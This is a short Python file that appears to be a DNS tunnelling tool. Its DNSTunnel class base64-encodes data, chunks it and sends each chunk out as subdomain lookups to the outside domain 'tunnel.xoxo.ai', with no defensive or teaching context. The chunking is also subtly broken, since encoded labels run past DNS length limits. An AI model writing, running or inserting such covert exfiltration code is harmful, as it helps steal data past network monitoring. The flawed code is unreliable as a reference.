import socket
import base64
import time

class DNSTunnel:
    def __init__(self, server="8.8.8.8", domain="tunnel.xoxo.ai"):
        self.server = server
        self.domain = domain
    
    def encode_data(self, data):
        encoded = base64.b64encode(data.encode()).decode()
        return encoded.replace('+', '-').replace('/', '_').replace('=', '')
    
    def send_dns_query(self, subdomain):
        try:
            full_domain = f"{subdomain}.{self.domain}"
            socket.gethostbyname(full_domain)
            return True
        except:
            return False
    
    def send_data(self, data):
        chunk_size = 50
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        for i, chunk in enumerate(chunks):
            encoded = self.encode_data(chunk)
            seq = f"{i:04d}"
            subdomain = f"{seq}_{encoded}"
            self.send_dns_query(subdomain)
            time.sleep(0.1)
        self.send_dns_query("FFFF_EOF")
        return "Data sent via DNS"